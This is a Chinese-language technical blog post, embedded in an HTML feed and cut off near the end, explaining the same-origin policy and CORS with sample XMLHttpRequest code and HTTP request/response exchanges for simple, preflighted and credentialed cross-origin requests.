    <content type="html"><![CDATA[<h1 id="同源策略和CORS"><a href="#同源策略和CORS" class="headerlink" title="同源策略和CORS"></a>同源策略和CORS</h1><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同源策略是一种安全策略，用于限制origin的文档或者文档所加载的脚本如何同另外一个源进行交互，用于帮助阻隔恶意文档，减少可能被攻击的媒介。</p><h2 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h2><p>这个方案也被称为“协议/主机/端口元组” </p><p>例如</p><p><a href="http://store.company.com/dir/page.html">http://store.company.com/dir/page.html</a> 的源进行对比的示例:</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210506203252.png" alt=""></p><h2 id="源的继承"><a href="#源的继承" class="headerlink" title="源的继承"></a>源的继承</h2><p>在页面中通过 about:blank 或 javascript: URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。</p><p>例如，about:blank通常作为父脚本写入内容的新的空白弹出窗口的 URL（例如，通过 Window.open() ）。 如果此弹出窗口也包含 JavaScript，则该脚本将从创建它的脚本那里继承对应的源。</p><h2 id="如何允许跨源访问"><a href="#如何允许跨源访问" class="headerlink" title="如何允许跨源访问"></a>如何允许跨源访问</h2><p>可以使用CORS来允许跨源访问，CORS是HTTP的一部分，它允许服务端来指定哪些主机可以从这个服务端加载资源</p><h2 id="如何阻止跨源访问"><a href="#如何阻止跨源访问" class="headerlink" title="如何阻止跨源访问"></a>如何阻止跨源访问</h2><p>1.阻止跨域写操作，利用一个CSRF token作为请求中的一个不可推测的标记，使用这个标记来阻止页面的跨站读操作。</p><p>2.阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。</p><p>3.阻止跨站嵌入，需要确保你的资源不能通过以上列出的可嵌入资源格式使用。因为浏览器可能不会遵守Content-Type头部定义的类型，例如HTML文档中的<code>&lt;script&gt;</code>标记</p><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>允许以下对Window属性的跨源访问：</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h3><p>window.blur</p><p>window.close</p><p>window.focus</p><p>window.postMessage</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210506203408.png" alt=""></p><p>部分某些浏览器允许访问除了以上更多的属性</p><h2 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h2><p>允许以下对Location属性的跨源访问：</p><hr><p><code>[location.replace](https://developer.mozilla.org/zh-CN/docs/Web/API/Location/replace)</code></p><hr><p><a href="https://www.notion.so/11ce487d19354029ad7bac86ef58d898">Untitled</a></p><p>同上某些浏览器允许访问除上述外更多的属性</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the first resource was served. A web page may freely embed cross-origin images, stylesheets, scripts, iframes, and videos. Certain “cross-domain” requests, notably Ajax requests, are forbidden by default by the same-origin security policy. Cross-origin resource sharing </p><p>(CORS)是一种机制，它允许一个网页上受限制的资源(例如字体)，从提供一手资源的域名以外的另一个域名请求跨来源资源共享。 一个网页可以自由地嵌入跨来源的图片、样式表、脚本、 iframe 和视频。 默认情况下，同源安全策略禁止某些“跨域”请求，特别是 Ajax 请求。</p><p>eg:运行在 <a href="http://domain-a.com/">http://domain-a.com</a> 的JavaScript代码使用XMLHttpRequest来发起一个到 <a href="https://domain-b.com/data.json">https://domain-b.com/data.json</a> 的请求。</p><p>出于安全性，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors1.png" alt=""></p><h2 id="什么情况下需要CORS？"><a href="#什么情况下需要CORS？" class="headerlink" title="什么情况下需要CORS？"></a>什么情况下需要CORS？</h2><p>1.XMLHttpRequest或Fetch发起的跨源HTTP请求。</p><p>2.Web字体（在CSS中通过@Font-face使用跨源字体资源）</p><p>3.WebGL贴图</p><p>4.使用drawImage将image/video 画面绘制到canvas</p><h2 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h2><p>跨源资源共享标准新增了一组HTTP首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源，另外，规范要求，对那些可能对服务器数据产生副作用的HTTP请求方法（特别是GET外的那些方法），浏览器<strong>必须先用OPTIONS方法发起一个预检请求</strong>，从而来获知服务器是否允许跨源请求，服务器确认允许之后，才发起实际的HTTP请求。在预请求中服务器也通知客户端，是否需要携带身份凭证（例如Cookies）</p><p>同时出于安全考虑，CORS请求失败产生错误是无法在JS代码层面是无法获知具体是哪里出了问题，你只能查看浏览器的控制台以得知具体是哪里出现了错误。</p><h2 id="访问控制场景示例"><a href="#访问控制场景示例" class="headerlink" title="访问控制场景示例"></a>访问控制场景示例</h2><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>部分请求不会触发CORS预检请求，我们将这样的请求称为“简单请求”。若满足所有下述条件，则该请求可视为“简单请求”：</p><ul><li>使用下列方法之一：<ul><li><code>[GET](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)</code></li><li><code>[HEAD](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)</code></li><li><code>[POST](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)</code></li></ul></li><li>除了被用户代理自动设置的首部字段（例如 <code>[Connection](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)</code> ，<code>[User-Agent](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent)</code>）和在 Fetch 规范中定义为 <a href="https://fetch.spec.whatwg.org/#forbidden-header-name">禁用首部名称</a> 的其他首部，允许人为设置的字段为 Fetch 规范定义的 <a href="https://fetch.spec.whatwg.org/#cors-safelisted-request-header">对 CORS 安全的首部字段集合</a>。该集合为：<ul><li><code>[Accept](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)</code></li><li><code>[Accept-Language](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)</code></li><li><code>[Content-Language](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language)</code></li><li><code>[Content-Type](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)</code> （需要注意额外的限制）</li><li><code>[DPR](https://httpwg.org/http-extensions/client-hints.html#dpr)</code></li><li><code>[Downlink](https://httpwg.org/http-extensions/client-hints.html#downlink)</code></li><li><code>[Save-Data](https://httpwg.org/http-extensions/client-hints.html#save-data)</code></li><li><code>[Viewport-Width](https://httpwg.org/http-extensions/client-hints.html#viewport-width)</code></li><li><code>[Width](https://httpwg.org/http-extensions/client-hints.html#width)</code></li></ul></li><li><code>[Content-Type](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)</code> 的值仅限于下列三者之一：<ul><li><code>text/plain</code></li><li><code>multipart/form-data</code></li><li><code>application/x-www-form-urlencoded</code></li></ul></li><li>请求中的任意<code>XMLHttpRequestUpload</code> 对象均没有注册任何事件监听器；<code>XMLHttpRequestUpload</code> 对象可以使用 <code>[XMLHttpRequest.upload](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload)</code> 属性访问。</li><li>请求中没有使用 <code>[ReadableStream](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream)</code> 对象。</li></ul><p><strong>注意：</strong>这些跨站点请求与浏览器发出的其他跨站点请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨站请求的网站无需为这一新的HTTp访问特性担心。</p><p>例如站点<a href="http://foo.example/">http://foo.example</a> 的网页应用想要访问 <a href="http://bar.other/">http://bar.other</a> 的资源。<a href="http://foo.example/">http://foo.example</a> 的网页中可能包含类似于下面的 JavaScript 代码：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/public-data/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.onreadystatechange = handler;</span><br><span class="line">    invocation.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端和服务器之间使用CORS首部字段来处理权限：</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors2.png" alt=""></p><p>请求报文和响应报文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 00:23:53 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line"></span><br><span class="line">[XML Data]</span><br></pre></td></tr></table></figure><p>请求的首部字段Origin表明该请求来自<a href="http://foo.example.。">http://foo.example.。</a></p><p>在响应报文中，响应首部字段</p><p><code>[Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)</code>（第 16 行）。使用 <code>[Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin)</code> 和 <code>[Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)</code> 就能完成最简单的访问控制。本例中，服务端返回的 <code>Access-Control-Allow-Origin: *</code> 表明，该资源可以被<strong>任意</strong>外域访问。如果服务端仅允许来自 <a href="http://foo.example">http://foo.example</a> 的访问，该首部字段的内容如下：</p><p><code>Access-Control-Allow-Origin: http://foo.example</code></p><p>这样的话，除了</p><p><a href="http://foo.example/">http://foo.example</a>，其它外域均不能访问该资源（该策略由请求首部中的 ORIGIN 字段定义，见第10行）。Access-Control-Allow-Origin 应当为 * 或者包含由 Origin 首部字段所指明的域名。</p><h3 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h3><p>与前述简单请求不同，“需预检的请求”要求必须首先使用 <code>[OPTIONS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)</code>   方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。”预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。</p><p>如下是一个需要执行预检请求的 HTTP 请求：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/post-here/&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> body = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation)</span><br><span class="line">    &#123;</span><br><span class="line">      invocation.open(<span class="string">&#x27;POST&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">      invocation.setRequestHeader(<span class="string">&#x27;X-PINGOTHER&#x27;</span>, <span class="string">&#x27;pingpong&#x27;</span>);</span><br><span class="line">      invocation.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>);</span><br><span class="line">      invocation.onreadystatechange = handler;</span><br><span class="line">      invocation.send(body);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>上面的代码使用POSt请求发送一个XML文档，该请求包含了一个自定义的请求首部字段（X-PINGOTHER：pingpong）。另外，请求的Content-Type为application/xml.因此，该请求需要首先发出预检请求。</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors3.png" alt=""></p><p>预检请求的请求包和响应包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER, Content-Type</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br></pre></td></tr></table></figure><p>之后发送的实际请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-PINGOTHER: pingpong</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;UTF-8</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;preflightInvocation.html</span><br><span class="line">Content-Length: 55</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;&#x2F;name&gt;&lt;&#x2F;person&gt;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:40 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 235</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;99</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">[Some GZIP&#39;d payload]</span><br></pre></td></tr></table></figure><p>浏览器检测到从js中发起的请求需要被预检，于是先发送了一个OPTIONS方法的“预检请求”。</p><p>预检请求中同时携带了下面两个首部字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER, Content-Type</span><br></pre></td></tr></table></figure><p>首部字段 Access-Control-Request-Method 告知服务器，实际请求将使用 POST 方法。首部字段 Access-Control-Request-Headers 告知服务器，实际请求将携带两个自定义请求首部字段：X-PINGOTHER 与 Content-Type。服务器据此决定，该实际请求是否被允许。</p><p>下面是需要注意的重点内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br></pre></td></tr></table></figure><p>首部字段 <code>Access-Control-Allow-Methods</code> 表明服务器允许客户端使用 <code>POST,</code> <code>GET</code> 和 <code>OPTIONS</code> 方法发起请求。该字段与 <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.7">HTTP/1.1 Allow: response header</a> 类似，但仅限于在需要访问控制的场景中使用。</p><p>首部字段 <code>Access-Control-Allow-Headers</code> 表明服务器允许请求中携带字段 <code>X-PINGOTHER</code> 与 <code>Content-Type</code>。与 <code>Access-Control-Allow-Methods</code> 一样，<code>Access-Control-Allow-Headers</code> 的值为逗号分割的列表。</p><p>最后，首部字段 <code>Access-Control-Max-Age</code> 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该首部字段的值超过了最大有效时间，将不会生效。</p><h3 id="预检请求与重定向"><a href="#预检请求与重定向" class="headerlink" title="预检请求与重定向"></a>预检请求与重定向</h3><p>大多数浏览器不支持对于预检请求的重定向，浏览器将报告错误</p><blockquote><p>The request was redirected to ‘<a href="https://example.com/foo">https://example.com/foo</a>‘, which is disallowed for cross-origin requests that require preflight</p><p>Request requires preflight, which is disallowed to follow cross-origin redirect</p></blockquote><p>CORS最初是允许该行为的，<strong>不过在后续的修订中废弃了这一要求</strong></p><p>有两种方法对上述报错行为进行规避</p><ul><li>在服务端去掉对预检请求的重定向；</li><li>将实际请求变成一个简单请求。</li></ul><p>如果使用以上两种方法存在困难，我们仍有其他方法：</p><ul><li>发出一个简单请求（使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/url">Response.url</a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL">XHR.responseURL</a>）以判断真正的预检请求会返回什么地址。</li><li>发出另一个请求（真正的请求），使用在上一步通过<a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/url">Response.url</a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL">XMLHttpRequest.responseURL</a>获得的URL。</li></ul><p>注意：如果请求是由于存在 Authorization 字段而引发了预检请求，则这一方法将无法使用。这种情况只能由服务端进行更改。</p><h2 id="附带身份凭证的请求"><a href="#附带身份凭证的请求" class="headerlink" title="附带身份凭证的请求"></a>附带身份凭证的请求</h2><p><code>[XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)</code> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> 与 CORS 的一个有趣的特性是，可以基于  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a> 和 HTTP 认证信息发送身份凭证。一般而言，对于跨源 <code>[XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)</code> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> 请求，浏览器<strong>不会</strong>发送身份凭证信息。如果要发送凭证信息，需要设置 <code>[XMLHttpRequest](https://developer.mozilla.org/en-US/DOM/XMLHttpRequest)</code> 的某个特殊标志位。</p><p>本例中，<a href="http://foo.example">http://foo.example</a> 的某脚本向 <a href="http://bar.other">http://bar.other</a> 发起一个GET 请求，并设置 Cookies：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/credentialed-content/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    invocation.onreadystatechange = handler;</span><br><span class="line">    invocation.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XMLHttpRequest 的 withCredentials 标志设置为 true，从而向服务器发送 Cookies。因为这是一个简单 GET 请求，所以浏览器不会对其发起“预检请求”。但是，如果服务器端的响应中未携带 Access-Control-Allow-Credentials: true ，浏览器将不会把响应内容返回给请求的发送者。</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors4.png" alt=""></p><p>请求包和响应包如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;access-control-with-credentials&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;credential.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Cookie: pageAccess&#x3D;2</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:34:52 GMT</span><br><span class="line">Server: Apache&#x2F;2</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: pageAccess&#x3D;3; expires&#x3D;Wed, 31-Dec-2008 01:34:53 GMT</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">[text&#x2F;plain payload]</span><br></pre></td></tr></table></figure><p>即使指定了Cookie的相关信息，如果bar.other的响应中缺失Access-Control-Allow-Credentials: true,则响应内容也不会返回给发起请求者</p><h3 id="附带身份凭证的请求与通配符"><a href="#附带身份凭证的请求与通配符" class="headerlink" title="附带身份凭证的请求与通配符"></a>附带身份凭证的请求与通配符</h3><p>对于附带身份凭证的请求，服务器不得设置 <code>Access-Control-Allow-Origin</code> 的值为“<code>*</code>”。</p><p>这是因为请求的首部中携带了 <code>Cookie</code> 信息，如果 <code>Access-Control-Allow-Origin</code> 的值为“<code>*</code>”，请求将会失败。而将 <code>Access-Control-Allow-Origin</code> 的值设置为 <code>http://foo.example</code>，则请求将成功执行。</p><p>另外，响应首部中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。</p><h3 id="第三方cookies"><a href="#第三方cookies" class="headerlink" title="第三方cookies"></a>第三方cookies</h3><p>注意在CORS响应中设置的cookies使用一般性第三方cookie策略。在上面的例子中，页面是在‘foo。example’加载，但是第20行的cookie是被‘bar.other’发送的，如果用户设置其浏览器拒绝所有第三方cookies，那么将不会被保存。</p><h2 id="HTTP响应首部字段"><a href="#HTTP响应首部字段" class="headerlink" 